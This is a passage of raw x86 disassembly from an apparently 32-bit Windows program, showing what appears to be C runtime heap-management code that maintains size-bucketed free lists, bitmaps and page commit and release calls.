  426855:	cmp    ebx,esi
  426857:	jbe    0x42685b
  426859:	mov    ebx,esi
  42685b:	add    ecx,DWORD PTR [ebp-0x8]
  42685e:	mov    edx,ecx
  426860:	sar    edx,0x4
  426863:	dec    edx
  426864:	cmp    edx,esi
  426866:	mov    DWORD PTR [ebp-0x4],ecx
  426869:	jbe    0x42686d
  42686b:	mov    edx,esi
  42686d:	cmp    ebx,edx
  42686f:	je     0x4268cf
  426871:	mov    ecx,DWORD PTR [ebp+0xc]
  426874:	mov    esi,DWORD PTR [ecx+0x4]
  426877:	cmp    esi,DWORD PTR [ecx+0x8]
  42687a:	jne    0x4268b7
  42687c:	cmp    ebx,0x20
  42687f:	mov    esi,0x80000000
  426884:	jae    0x42689d
  426886:	mov    ecx,ebx
  426888:	shr    esi,cl
  42688a:	not    esi
  42688c:	and    DWORD PTR [eax+edi*4+0x44],esi
  426890:	dec    BYTE PTR [ebx+eax*1+0x4]
  426894:	jne    0x4268b7
  426896:	mov    ecx,DWORD PTR [ebp+0x8]
  426899:	and    DWORD PTR [ecx],esi
  42689b:	jmp    0x4268b7
  42689d:	lea    ecx,[ebx-0x20]
  4268a0:	shr    esi,cl
  4268a2:	not    esi
  4268a4:	and    DWORD PTR [eax+edi*4+0xc4],esi
  4268ab:	dec    BYTE PTR [ebx+eax*1+0x4]
  4268af:	jne    0x4268b7
  4268b1:	mov    ecx,DWORD PTR [ebp+0x8]
  4268b4:	and    DWORD PTR [ecx+0x4],esi
  4268b7:	mov    ecx,DWORD PTR [ebp+0xc]
  4268ba:	mov    esi,DWORD PTR [ecx+0x8]
  4268bd:	mov    ecx,DWORD PTR [ecx+0x4]
  4268c0:	mov    DWORD PTR [esi+0x4],ecx
  4268c3:	mov    ecx,DWORD PTR [ebp+0xc]
  4268c6:	mov    esi,DWORD PTR [ecx+0x4]
  4268c9:	mov    ecx,DWORD PTR [ecx+0x8]
  4268cc:	mov    DWORD PTR [esi+0x8],ecx
  4268cf:	mov    esi,DWORD PTR [ebp+0xc]
  4268d2:	jmp    0x4268d7
  4268d4:	mov    ebx,DWORD PTR [ebp+0x8]
  4268d7:	cmp    DWORD PTR [ebp-0xc],0x0
  4268db:	jne    0x4268e5
  4268dd:	cmp    ebx,edx
  4268df:	je     0x426965
  4268e5:	mov    ecx,DWORD PTR [ebp-0x10]
  4268e8:	lea    ecx,[ecx+edx*8]
  4268eb:	mov    ebx,DWORD PTR [ecx+0x4]
  4268ee:	mov    DWORD PTR [esi+0x8],ecx
  4268f1:	mov    DWORD PTR [esi+0x4],ebx
  4268f4:	mov    DWORD PTR [ecx+0x4],esi
  4268f7:	mov    ecx,DWORD PTR [esi+0x4]
  4268fa:	mov    DWORD PTR [ecx+0x8],esi
  4268fd:	mov    ecx,DWORD PTR [esi+0x4]
  426900:	cmp    ecx,DWORD PTR [esi+0x8]
  426903:	jne    0x426965
  426905:	mov    cl,BYTE PTR [edx+eax*1+0x4]
  426909:	mov    BYTE PTR [ebp+0xf],cl
  42690c:	inc    cl
  42690e:	cmp    edx,0x20
  426911:	mov    BYTE PTR [edx+eax*1+0x4],cl
  426915:	jae    0x42693c
  426917:	cmp    BYTE PTR [ebp+0xf],0x0
  42691b:	jne    0x42692b
  42691d:	mov    ecx,edx
  42691f:	mov    ebx,0x80000000
  426924:	shr    ebx,cl
  426926:	mov    ecx,DWORD PTR [ebp+0x8]
  426929:	or     DWORD PTR [ecx],ebx
  42692b:	mov    ebx,0x80000000
  426930:	mov    ecx,edx
  426932:	shr    ebx,cl
  426934:	lea    eax,[eax+edi*4+0x44]
  426938:	or     DWORD PTR [eax],ebx
  42693a:	jmp    0x426965
  42693c:	cmp    BYTE PTR [ebp+0xf],0x0
  426940:	jne    0x426952
  426942:	lea    ecx,[edx-0x20]
  426945:	mov    ebx,0x80000000
  42694a:	shr    ebx,cl
  42694c:	mov    ecx,DWORD PTR [ebp+0x8]
  42694f:	or     DWORD PTR [ecx+0x4],ebx
  426952:	lea    ecx,[edx-0x20]
  426955:	mov    edx,0x80000000
  42695a:	shr    edx,cl
  42695c:	lea    eax,[eax+edi*4+0xc4]
  426963:	or     DWORD PTR [eax],edx
  426965:	mov    eax,DWORD PTR [ebp-0x4]
  426968:	mov    DWORD PTR [esi],eax
  42696a:	mov    DWORD PTR [eax+esi*1-0x4],eax
  42696e:	mov    eax,DWORD PTR [ebp-0x10]
  426971:	dec    DWORD PTR [eax]
  426973:	jne    0x426a70
  426979:	mov    eax,ds:0x45def8
  42697e:	test   eax,eax
  426980:	je     0x426a62
  426986:	mov    ecx,DWORD PTR ds:0x45df10
  42698c:	mov    esi,DWORD PTR ds:0x4290b0
  426992:	push   0x4000
  426997:	shl    ecx,0xf
  42699a:	add    ecx,DWORD PTR [eax+0xc]
  42699d:	mov    ebx,0x8000
  4269a2:	push   ebx
  4269a3:	push   ecx
  4269a4:	call   esi
  4269a6:	mov    ecx,DWORD PTR ds:0x45df10
  4269ac:	mov    eax,ds:0x45def8
  4269b1:	mov    edx,0x80000000
  4269b6:	shr    edx,cl
  4269b8:	or     DWORD PTR [eax+0x8],edx
  4269bb:	mov    eax,ds:0x45def8
  4269c0:	mov    eax,DWORD PTR [eax+0x10]
  4269c3:	mov    ecx,DWORD PTR ds:0x45df10
  4269c9:	and    DWORD PTR [eax+ecx*4+0xc4],0x0
  4269d1:	mov    eax,ds:0x45def8
  4269d6:	mov    eax,DWORD PTR [eax+0x10]
  4269d9:	dec    BYTE PTR [eax+0x43]
  4269dc:	mov    eax,ds:0x45def8
  4269e1:	mov    ecx,DWORD PTR [eax+0x10]
  4269e4:	cmp    BYTE PTR [ecx+0x43],0x0
  4269e8:	jne    0x4269f3
  4269ea:	and    DWORD PTR [eax+0x4],0xfffffffe
  4269ee:	mov    eax,ds:0x45def8
  4269f3:	cmp    DWORD PTR [eax+0x8],0xffffffff
  4269f7:	jne    0x426a62
  4269f9:	push   ebx
  4269fa:	push   0x0
  4269fc:	push   DWORD PTR [eax+0xc]
  4269ff:	call   esi
  426a01:	mov    eax,ds:0x45def8
  426a06:	push   DWORD PTR [eax+0x10]
  426a09:	push   0x0
  426a0b:	push   DWORD PTR ds:0x45e140
  426a11:	call   DWORD PTR ds:0x429048
  426a17:	mov    eax,ds:0x45defc
  426a1c:	mov    edx,DWORD PTR ds:0x45df00
  426a22:	lea    eax,[eax+eax*4]
  426a25:	shl    eax,0x2
  426a28:	mov    ecx,eax
  426a2a:	mov    eax,ds:0x45def8
  426a2f:	sub    ecx,eax
  426a31:	lea    ecx,[ecx+edx*1-0x14]
  426a35:	push   ecx
  426a36:	lea    ecx,[eax+0x14]
  426a39:	push   ecx
  426a3a:	push   eax
  426a3b:	call   0x428290
  426a40:	mov    eax,DWORD PTR [ebp+0x8]
  426a43:	add    esp,0xc
  426a46:	dec    DWORD PTR ds:0x45defc
  426a4c:	cmp    eax,DWORD PTR ds:0x45def8
  426a52:	jbe    0x426a58
  426a54:	sub    DWORD PTR [ebp+0x8],0x14
  426a58:	mov    eax,ds:0x45df00
  426a5d:	mov    ds:0x45df08,eax
  426a62:	mov    eax,DWORD PTR [ebp+0x8]
  426a65:	mov    ds:0x45def8,eax
  426a6a:	mov    DWORD PTR ds:0x45df10,edi
  426a70:	pop    ebx
  426a71:	pop    edi
  426a72:	pop    esi
  426a73:	leave  
  426a74:	ret    
  426a75:	mov    eax,ds:0x45defc
  426a7a:	mov    ecx,DWORD PTR ds:0x45df0c
  426a80:	push   edi
  426a81:	xor    edi,edi
  426a83:	cmp    eax,ecx
  426a85:	jne    0x426abb
  426a87:	lea    eax,[ecx+ecx*4+0x50]
  426a8b:	shl    eax,0x2
  426a8e:	push   eax
  426a8f:	push   DWORD PTR ds:0x45df00
  426a95:	push   edi
  426a96:	push   DWORD PTR ds:0x45e140
  426a9c:	call   DWORD PTR ds:0x4290d4
  426aa2:	cmp    eax,edi
  426aa4:	jne    0x426aaa
  426aa6:	xor    eax,eax
  426aa8:	pop    edi
  426aa9:	ret    
  426aaa:	add    DWORD PTR ds:0x45df0c,0x10
  426ab1:	mov    ds:0x45df00,eax
  426ab6:	mov    eax,ds:0x45defc
  426abb:	mov    ecx,DWORD PTR ds:0x45df00
  426ac1:	push   esi
  426ac2:	push   0x41c4
  426ac7:	push   0x8
  426ac9:	push   DWORD PTR ds:0x45e140
  426acf:	lea    eax,[eax+eax*4]
  426ad2:	lea    esi,[ecx+eax*4]
  426ad5:	call   DWORD PTR ds:0x429030
  426adb:	cmp    eax,edi
  426add:	mov    DWORD PTR [esi+0x10],eax
  426ae0:	jne    0x426ae6
  426ae2:	xor    eax,eax
  426ae4:	jmp    0x426b29
  426ae6:	push   0x4
  426ae8:	push   0x2000
  426aed:	push   0x100000
  426af2:	push   edi
  426af3:	call   DWORD PTR ds:0x4290d0
  426af9:	cmp    eax,edi
  426afb:	mov    DWORD PTR [esi+0xc],eax
  426afe:	jne    0x426b12
  426b00:	push   DWORD PTR [esi+0x10]
  426b03:	push   edi
  426b04:	push   DWORD PTR ds:0x45e140
  426b0a:	call   DWORD PTR ds:0x429048
  426b10:	jmp    0x426ae2
  426b12:	or     DWORD PTR [esi+0x8],0xffffffff
  426b16:	mov    DWORD PTR [esi],edi
  426b18:	mov    DWORD PTR [esi+0x4],edi
  426b1b:	inc    DWORD PTR ds:0x45defc
  426b21:	mov    eax,DWORD PTR [esi+0x10]
  426b24:	or     DWORD PTR [eax],0xffffffff
  426b27:	mov    eax,esi
  426b29:	pop    esi
  426b2a:	pop    edi
  426b2b:	ret    
  426b2c:	push   ebp
  426b2d:	mov    ebp,esp
  426b2f:	push   ecx
  426b30:	push   ecx
  426b31:	mov    ecx,DWORD PTR [ebp+0x8]
  426b34:	mov    eax,DWORD PTR [ecx+0x8]
  426b37:	push   ebx
  426b38:	push   esi
  426b39:	mov    esi,DWORD PTR [ecx+0x10]
  426b3c:	push   edi
  426b3d:	xor    ebx,ebx
  426b3f:	jmp    0x426b44
  426b41:	shl    eax,1
  426b43:	inc    ebx
  426b44:	test   eax,eax
  426b46:	jge    0x426b41
  426b48:	mov    eax,ebx
  426b4a:	imul   eax,eax,0x204
  426b50:	lea    eax,[eax+esi*1+0x144]
  426b57:	push   0x3f
  426b59:	mov    DWORD PTR [ebp-0x8],eax
  426b5c:	pop    edx
  426b5d:	mov    DWORD PTR [eax+0x8],eax
  426b60:	mov    DWORD PTR [eax+0x4],eax
  426b63:	add    eax,0x8
  426b66:	dec    edx
  426b67:	jne    0x426b5d
  426b69:	push   0x4
  426b6b:	mov    edi,ebx
  426b6d:	push   0x1000
  426b72:	shl    edi,0xf
  426b75:	add    edi,DWORD PTR [ecx+0xc]
  426b78:	push   0x8000
  426b7d:	push   edi
  426b7e:	call   DWORD PTR ds:0x4290d0
  426b84:	test   eax,eax
  426b86:	jne    0x426b90
  426b88:	or     eax,0xffffffff
  426b8b:	jmp    0x426c2d
  426b90:	lea    edx,[edi+0x7000]
  426b96:	cmp    edi,edx
  426b98:	mov    DWORD PTR [ebp-0x4],edx
  426b9b:	ja     0x426be0
  426b9d:	mov    ecx,edx
  426b9f:	sub    ecx,edi
  426ba1:	shr    ecx,0xc
  426ba4:	lea    eax,[edi+0x10]
  426ba7:	inc    ecx
  426ba8:	or     DWORD PTR [eax-0x8],0xffffffff
  426bac:	or     DWORD PTR [eax+0xfec],0xffffffff
  426bb3:	lea    edx,[eax+0xffc]
  426bb9:	mov    DWORD PTR [eax],edx
  426bbb:	lea    edx,[eax-0x1004]
  426bc1:	mov    DWORD PTR [eax-0x4],0xff0
  426bc8:	mov    DWORD PTR [eax+0x4],edx
  426bcb:	mov    DWORD PTR [eax+0xfe8],0xff0
  426bd5:	add    eax,0x1000
  426bda:	dec    ecx
  426bdb:	jne    0x426ba8
  426bdd:	mov    edx,DWORD PTR [ebp-0x4]
  426be0:	mov    eax,DWORD PTR [ebp-0x8]
  426be3:	add    eax,0x1f8
  426be8:	lea    ecx,[edi+0xc]
  426beb:	mov    DWORD PTR [eax+0x4],ecx
  426bee:	mov    DWORD PTR [ecx+0x8],eax
  426bf1:	lea    ecx,[edx+0xc]
  426bf4:	mov    DWORD PTR [eax+0x8],ecx
  426bf7:	mov    DWORD PTR [ecx+0x4],eax
  426bfa:	and    DWORD PTR [esi+ebx*4+0x44],0x0
  426bff:	xor    edi,edi
  426c01:	inc    edi
  426c02:	mov    DWORD PTR [esi+ebx*4+0xc4],edi
  426c09:	mov    al,BYTE PTR [esi+0x43]
  426c0c:	mov    cl,al
  426c0e:	inc    cl
  426c10:	test   al,al
  426c12:	mov    eax,DWORD PTR [ebp+0x8]
  426c15:	mov    BYTE PTR [esi+0x43],cl
  426c18:	jne    0x426c1d
  426c1a:	or     DWORD PTR [eax+0x4],edi
  426c1d:	mov    edx,0x80000000
  426c22:	mov    ecx,ebx
  426c24:	shr    edx,cl
  426c26:	not    edx
  426c28:	and    DWORD PTR [eax+0x8],edx
  426c2b:	mov    eax,ebx
  426c2d:	pop    edi
  426c2e:	pop    esi
  426c2f:	pop    ebx
  426c30:	leave  
  426c31:	ret    
  426c32:	push   ebp
  426c33:	mov    ebp,esp
  426c35:	sub    esp,0xc
  426c38:	mov    ecx,DWORD PTR [ebp+0x8]
  426c3b:	mov    eax,DWORD PTR [ecx+0x10]
  426c3e:	push   ebx
  426c3f:	push   esi
  426c40:	mov    esi,DWORD PTR [ebp+0x10]
  426c43:	push   edi
  426c44:	mov    edi,DWORD PTR [ebp+0xc]
  426c47:	mov    edx,edi
  426c49:	sub    edx,DWORD PTR [ecx+0xc]
  426c4c:	add    esi,0x17
  426c4f:	shr    edx,0xf
  426c52:	mov    ecx,edx
  426c54:	imul   ecx,ecx,0x204
  426c5a:	lea    ecx,[ecx+eax*1+0x144]
  426c61:	mov    DWORD PTR [ebp-0xc],ecx
  426c64:	mov    ecx,DWORD PTR [edi-0x4]
  426c67:	and    esi,0xfffffff0
  426c6a:	dec    ecx
  426c6b:	cmp    esi,ecx
  426c6d:	lea    edi,[ecx+edi*1-0x4]
  426c71:	mov    ebx,DWORD PTR [edi]
  426c73:	mov    DWORD PTR [ebp+0x10],ecx
  426c76:	mov    DWORD PTR [ebp-0x4],ebx
  426c79:	jle    0x426dd4
  426c7f:	test   bl,0x1
  426c82:	jne    0x426dcd
  426c88:	add    ebx,ecx
  426c8a:	cmp    esi,ebx
  426c8c:	jg     0x426dcd
  426c92:	mov    ecx,DWORD PTR [ebp-0x4]
  426c95:	sar    ecx,0x4
  426c98:	dec    ecx
  426c99:	cmp    ecx,0x3f
  426c9c:	mov    DWORD PTR [ebp-0x8],ecx
  426c9f:	jbe    0x426ca7
  426ca1:	push   0x3f
  426ca3:	pop    ecx
  426ca4:	mov    DWORD PTR [ebp-0x8],ecx
  426ca7:	mov    ebx,DWORD PTR [edi+0x4]
  426caa:	cmp    ebx,DWORD PTR [edi+0x8]
  426cad:	jne    0x426cf2
  426caf:	cmp    ecx,0x20
  426cb2:	mov    ebx,0x80000000
  426cb7:	jae    0x426cd3
  426cb9:	shr    ebx,cl
  426cbb:	mov    ecx,DWORD PTR [ebp-0x8]
  426cbe:	lea    ecx,[ecx+eax*1+0x4]
  426cc2:	not    ebx
  426cc4:	and    DWORD PTR [eax+edx*4+0x44],ebx
  426cc8:	dec    BYTE PTR [ecx]
  426cca:	jne    0x426cf2
  426ccc:	mov    ecx,DWORD PTR [ebp+0x8]
  426ccf:	and    DWORD PTR [ecx],ebx
  426cd1:	jmp    0x426cf2
  426cd3:	add    ecx,0xffffffe0
  426cd6:	shr    ebx,cl
  426cd8:	mov    ecx,DWORD PTR [ebp-0x8]
  426cdb:	lea    ecx,[ecx+eax*1+0x4]
  426cdf:	not    ebx
  426ce1:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  426ce8:	dec    BYTE PTR [ecx]
  426cea:	jne    0x426cf2
  426cec:	mov    ecx,DWORD PTR [ebp+0x8]
  426cef:	and    DWORD PTR [ecx+0x4],ebx
  426cf2:	mov    ecx,DWORD PTR [edi+0x8]
  426cf5:	mov    ebx,DWORD PTR [edi+0x4]
  426cf8:	mov    DWORD PTR [ecx+0x4],ebx
  426cfb:	mov    ecx,DWORD PTR [edi+0x4]
  426cfe:	mov    edi,DWORD PTR [edi+0x8]
  426d01:	mov    DWORD PTR [ecx+0x8],edi
  426d04:	mov    ecx,DWORD PTR [ebp+0x10]
  426d07:	sub    ecx,esi
  426d09:	add    DWORD PTR [ebp-0x4],ecx
  426d0c:	cmp    DWORD PTR [ebp-0x4],0x0
  426d10:	jle    0x426dbb
  426d16:	mov    edi,DWORD PTR [ebp-0x4]
  426d19:	mov    ecx,DWORD PTR [ebp+0xc]
  426d1c:	sar    edi,0x4
  426d1f:	dec    edi
  426d20:	cmp    edi,0x3f
  426d23:	lea    ecx,[ecx+esi*1-0x4]
  426d27:	jbe    0x426d2c
  426d29:	push   0x3f
  426d2b:	pop    edi
  426d2c:	mov    ebx,DWORD PTR [ebp-0xc]
  426d2f:	lea    ebx,[ebx+edi*8]
  426d32:	mov    DWORD PTR [ebp+0x10],ebx
  426d35:	mov    ebx,DWORD PTR [ebx+0x4]
  426d38:	mov    DWORD PTR [ecx+0x4],ebx
  426d3b:	mov    ebx,DWORD PTR [ebp+0x10]
  426d3e:	mov    DWORD PTR [ecx+0x8],ebx
  426d41:	mov    DWORD PTR [ebx+0x4],ecx
  426d44:	mov    ebx,DWORD PTR [ecx+0x4]
  426d47:	mov    DWORD PTR [ebx+0x8],ecx
  426d4a:	mov    ebx,DWORD PTR [ecx+0x4]
  426d4d:	cmp    ebx,DWORD PTR [ecx+0x8]
  426d50:	jne    0x426da9
  426d52:	mov    cl,BYTE PTR [edi+eax*1+0x4]
  426d56:	mov    BYTE PTR [ebp+0x13],cl
  426d59:	inc    cl
  426d5b:	cmp    edi,0x20
  426d5e:	mov    BYTE PTR [edi+eax*1+0x4],cl
  426d62:	jae    0x426d80
  426d64:	cmp    BYTE PTR [ebp+0x13],0x0
  426d68:	jne    0x426d78
  426d6a:	mov    ecx,edi
  426d6c:	mov    ebx,0x80000000
  426d71:	shr    ebx,cl
  426d73:	mov    ecx,DWORD PTR [ebp+0x8]
  426d76:	or     DWORD PTR [ecx],ebx
  426d78:	lea    eax,[eax+edx*4+0x44]
  426d7c:	mov    ecx,edi
  426d7e:	jmp    0x426da0
  426d80:	cmp    BYTE PTR [ebp+0x13],0x0
  426d84:	jne    0x426d96
  426d86:	lea    ecx,[edi-0x20]
  426d89:	mov    ebx,0x80000000
  426d8e:	shr    ebx,cl
  426d90:	mov    ecx,DWORD PTR [ebp+0x8]
  426d93:	or     DWORD PTR [ecx+0x4],ebx
  426d96:	lea    eax,[eax+edx*4+0xc4]
  426d9d:	lea    ecx,[edi-0x20]
  426da0:	mov    edx,0x80000000
  426da5:	shr    edx,cl
  426da7:	or     DWORD PTR [eax],edx
  426da9:	mov    edx,DWORD PTR [ebp+0xc]
  426dac:	mov    ecx,DWORD PTR [ebp-0x4]
  426daf:	lea    eax,[edx+esi*1-0x4]
  426db3:	mov    DWORD PTR [eax],ecx
  426db5:	mov    DWORD PTR [ecx+eax*1-0x4],ecx
  426db9:	jmp    0x426dbe
  426dbb:	mov    edx,DWORD PTR [ebp+0xc]
  426dbe:	lea    eax,[esi+0x1]
  426dc1:	mov    DWORD PTR [edx-0x4],eax
  426dc4:	mov    DWORD PTR [edx+esi*1-0x8],eax
  426dc8:	jmp    0x426f09
  426dcd:	xor    eax,eax
  426dcf:	jmp    0x426f0c
  426dd4:	jge    0x426f09
  426dda:	mov    ebx,DWORD PTR [ebp+0xc]
  426ddd:	sub    DWORD PTR [ebp+0x10],esi
  426de0:	lea    ecx,[esi+0x1]
  426de3:	mov    DWORD PTR [ebx-0x4],ecx
  426de6:	lea    ebx,[ebx+esi*1-0x4]
  426dea:	mov    esi,DWORD PTR [ebp+0x10]
  426ded:	sar    esi,0x4
  426df0:	dec    esi
  426df1:	cmp    esi,0x3f
  426df4:	mov    DWORD PTR [ebp+0xc],ebx
  426df7:	mov    DWORD PTR [ebx-0x4],ecx
  426dfa:	jbe    0x426dff
  426dfc:	push   0x3f
  426dfe:	pop    esi
  426dff:	test   BYTE PTR [ebp-0x4],0x1
  426e03:	jne    0x426e89
  426e09:	mov    esi,DWORD PTR [ebp-0x4]
  426e0c:	sar    esi,0x4
  426e0f:	dec    esi
  426e10:	cmp    esi,0x3f
  426e13:	jbe    0x426e18
  426e15:	push   0x3f
  426e17:	pop    esi
  426e18:	mov    ecx,DWORD PTR [edi+0x4]
  426e1b:	cmp    ecx,DWORD PTR [edi+0x8]
  426e1e:	jne    0x426e62
  426e20:	cmp    esi,0x20
  426e23:	mov    ebx,0x80000000
  426e28:	jae    0x426e43
  426e2a:	mov    ecx,esi
  426e2c:	shr    ebx,cl
  426e2e:	lea    esi,[esi+eax*1+0x4]
  426e32:	not    ebx
  426e34:	and    DWORD PTR [eax+edx*4+0x44],ebx
  426e38:	dec    BYTE PTR [esi]
  426e3a:	jne    0x426e5f
  426e3c:	mov    ecx,DWORD PTR [ebp+0x8]
  426e3f:	and    DWORD PTR [ecx],ebx
  426e41:	jmp    0x426e5f
  426e43:	lea    ecx,[esi-0x20]
  426e46:	shr    ebx,cl
  426e48:	lea    ecx,[esi+eax*1+0x4]
  426e4c:	not    ebx
  426e4e:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  426e55:	dec    BYTE PTR [ecx]
  426e57:	jne    0x426e5f
  426e59:	mov    ecx,DWORD PTR [ebp+0x8]
  426e5c:	and    DWORD PTR [ecx+0x4],ebx
  426e5f:	mov    ebx,DWORD PTR [ebp+0xc]
  426e62:	mov    ecx,DWORD PTR [edi+0x8]
  426e65:	mov    esi,DWORD PTR [edi+0x4]
  426e68:	mov    DWORD PTR [ecx+0x4],esi
  426e6b:	mov    esi,DWORD PTR [edi+0x8]
  426e6e:	mov    ecx,DWORD PTR [edi+0x4]
  426e71:	mov    DWORD PTR [ecx+0x8],esi
  426e74:	mov    esi,DWORD PTR [ebp+0x10]
  426e77:	add    esi,DWORD PTR [ebp-0x4]
  426e7a:	mov    DWORD PTR [ebp+0x10],esi
  426e7d:	sar    esi,0x4
  426e80:	dec    esi
  426e81:	cmp    esi,0x3f
  426e84:	jbe    0x426e89
  426e86:	push   0x3f
  426e88:	pop    esi
  426e89:	mov    ecx,DWORD PTR [ebp-0xc]
  426e8c:	lea    ecx,[ecx+esi*8]
  426e8f:	mov    edi,DWORD PTR [ecx+0x4]
  426e92:	mov    DWORD PTR [ebx+0x8],ecx
  426e95:	mov    DWORD PTR [ebx+0x4],edi
  426e98:	mov    DWORD PTR [ecx+0x4],ebx
  426e9b:	mov    ecx,DWORD PTR [ebx+0x4]
  426e9e:	mov    DWORD PTR [ecx+0x8],ebx
  426ea1:	mov    ecx,DWORD PTR [ebx+0x4]
  426ea4:	cmp    ecx,DWORD PTR [ebx+0x8]
  426ea7:	jne    0x426f00
  426ea9:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  426ead:	mov    BYTE PTR [ebp+0xf],cl
  426eb0:	inc    cl
  426eb2:	cmp    esi,0x20
  426eb5:	mov    BYTE PTR [esi+eax*1+0x4],cl
  426eb9:	jae    0x426ed7
  426ebb:	cmp    BYTE PTR [ebp+0xf],0x0
  426ebf:	jne    0x426ecf
  426ec1:	mov    ecx,esi
  426ec3:	mov    edi,0x80000000
  426ec8:	shr    edi,cl
  426eca:	mov    ecx,DWORD PTR [ebp+0x8]
  426ecd:	or     DWORD PTR [ecx],edi
  426ecf:	lea    eax,[eax+edx*4+0x44]
  426ed3:	mov    ecx,esi
  426ed5:	jmp    0x426ef7
  426ed7:	cmp    BYTE PTR [ebp+0xf],0x0
  426edb:	jne    0x426eed
  426edd:	lea    ecx,[esi-0x20]
  426ee0:	mov    edi,0x80000000
  426ee5:	shr    edi,cl
  426ee7:	mov    ecx,DWORD PTR [ebp+0x8]
  426eea:	or     DWORD PTR [ecx+0x4],edi
  426eed:	lea    eax,[eax+edx*4+0xc4]
  426ef4:	lea    ecx,[esi-0x20]
  426ef7:	mov    edx,0x80000000
  426efc:	shr    edx,cl
  426efe:	or     DWORD PTR [eax],edx
  426f00:	mov    eax,DWORD PTR [ebp+0x10]
  426f03:	mov    DWORD PTR [ebx],eax
  426f05:	mov    DWORD PTR [eax+ebx*1-0x4],eax
  426f09:	xor    eax,eax
  426f0b:	inc    eax
  426f0c:	pop    edi
  426f0d:	pop    esi
  426f0e:	pop    ebx
  426f0f:	leave  
  426f10:	ret    
  426f11:	push   ebp
  426f12:	mov    ebp,esp
  426f14:	sub    esp,0x14
  426f17:	mov    ecx,DWORD PTR [ebp+0x8]
  426f1a:	mov    eax,ds:0x45defc
  426f1f:	mov    edx,DWORD PTR ds:0x45df00
  426f25:	add    ecx,0x17
  426f28:	and    ecx,0xfffffff0
  426f2b:	push   ebx
  426f2c:	mov    DWORD PTR [ebp-0x10],ecx
  426f2f:	sar    ecx,0x4
  426f32:	push   esi
  426f33:	lea    eax,[eax+eax*4]
  426f36:	push   edi
  426f37:	dec    ecx
  426f38:	cmp    ecx,0x20
  426f3b:	lea    edi,[edx+eax*4]
  426f3e:	mov    DWORD PTR [ebp-0x4],edi
  426f41:	jge    0x426f4e
  426f43:	or     esi,0xffffffff
  426f46:	shr    esi,cl
  426f48:	or     DWORD PTR [ebp-0x8],0xffffffff
  426f4c:	jmp    0x426f5b
  426f4e:	add    ecx,0xffffffe0
  426f51:	or     eax,0xffffffff
  426f54:	xor    esi,esi
  426f56:	shr    eax,cl
  426f58:	mov    DWORD PTR [ebp-0x8],eax
  426f5b:	mov    eax,ds:0x45df08
  426f60:	mov    ebx,eax
  426f62:	mov    DWORD PTR [ebp-0xc],esi
  426f65:	cmp    ebx,edi
  426f67:	jmp    0x426f7d
  426f69:	mov    ecx,DWORD PTR [ebx+0x4]
  426f6c:	mov    edi,DWORD PTR [ebx]
  426f6e:	and    ecx,DWORD PTR [ebp-0x8]
  426f71:	and    edi,esi
  426f73:	or     ecx,edi
  426f75:	jne    0x426f82
  426f77:	add    ebx,0x14
  426f7a:	cmp    ebx,DWORD PTR [ebp-0x4]
  426f7d:	mov    DWORD PTR [ebp+0x8],ebx
  426f80:	jb     0x426f69
  426f82:	cmp    ebx,DWORD PTR [ebp-0x4]
  426f85:	jne    0x426fab
  426f87:	mov    ebx,edx
  426f89:	jmp    0x426f9c
  426f8b:	mov    ecx,DWORD PTR [ebx+0x4]
  426f8e:	mov    edi,DWORD PTR [ebx]
  426f90:	and    ecx,DWORD PTR [ebp-0x8]
  426f93:	and    edi,esi
  426f95:	or     ecx,edi
  426f97:	jne    0x426fa3
  426f99:	add    ebx,0x14
  426f9c:	cmp    ebx,eax
  426f9e:	mov    DWORD PTR [ebp+0x8],ebx
  426fa1:	jb     0x426f8b
  426fa3:	cmp    ebx,eax
  426fa5:	je     0x42703f
  426fab:	mov    DWORD PTR ds:0x45df08,ebx
  426fb1:	mov    eax,DWORD PTR [ebx+0x10]
  426fb4:	mov    edx,DWORD PTR [eax]
  426fb6:	cmp    edx,0xffffffff
  426fb9:	mov    DWORD PTR [ebp-0x4],edx
  426fbc:	je     0x426fd2
  426fbe:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  426fc5:	mov    edi,DWORD PTR [eax+edx*4+0x44]
  426fc9:	and    ecx,DWORD PTR [ebp-0x8]
  426fcc:	and    edi,esi
  426fce:	or     ecx,edi
  426fd0:	jne    0x427008
  426fd2:	mov    edx,DWORD PTR [eax+0xc4]
  426fd8:	and    edx,DWORD PTR [ebp-0x8]
  426fdb:	and    DWORD PTR [ebp-0x4],0x0
  426fdf:	lea    ecx,[eax+0x44]
  426fe2:	mov    esi,DWORD PTR [ecx]
  426fe4:	and    esi,DWORD PTR [ebp-0xc]
  426fe7:	or     edx,esi
  426fe9:	mov    esi,DWORD PTR [ebp-0xc]
  426fec:	jne    0x427005
  426fee:	mov    edx,DWORD PTR [ecx+0x84]
  426ff4:	and    edx,DWORD PTR [ebp-0x8]
  426ff7:	inc    DWORD PTR [ebp-0x4]
  426ffa:	add    ecx,0x4
  426ffd:	mov    edi,DWORD PTR [ecx]
  426fff:	and    edi,esi
  427001:	or     edx,edi
  427003:	je     0x426fee
  427005:	mov    edx,DWORD PTR [ebp-0x4]
  427008:	mov    ecx,edx
  42700a:	imul   ecx,ecx,0x204
  427010:	lea    ecx,[ecx+eax*1+0x144]
  427017:	mov    DWORD PTR [ebp-0xc],ecx
  42701a:	mov    ecx,DWORD PTR [eax+edx*4+0x44]
  42701e:	xor    edi,edi
  427020:	and    ecx,esi
  427022:	jne    0x427091
  427024:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  42702b:	and    ecx,DWORD PTR [ebp-0x8]
  42702e:	push   0x20
  427030:	pop    edi
  427031:	jmp    0x427091
  427033:	cmp    DWORD PTR [ebx+0x8],0x0
  427037:	jne    0x427044
  427039:	add    ebx,0x14
  42703c:	mov    DWORD PTR [ebp+0x8],ebx
  42703f:	cmp    ebx,DWORD PTR [ebp-0x4]
  427042:	jb     0x427033
  427044:	cmp    ebx,DWORD PTR [ebp-0x4]
  427047:	jne    0x42706f
  427049:	mov    ebx,edx
  42704b:	jmp    0x427056
  42704d:	cmp    DWORD PTR [ebx+0x8],0x0
  427051:	jne    0x42705d
  427053:	add    ebx,0x14
  427056:	cmp    ebx,eax
  427058:	mov    DWORD PTR [ebp+0x8],ebx
  42705b:	jb     0x42704d
  42705d:	cmp    ebx,eax
  42705f:	jne    0x42706f
  427061:	call   0x426a75
  427066:	mov    ebx,eax
  427068:	test   ebx,ebx
  42706a:	mov    DWORD PTR [ebp+0x8],ebx
  42706d:	je     0x427087
  42706f:	push   ebx
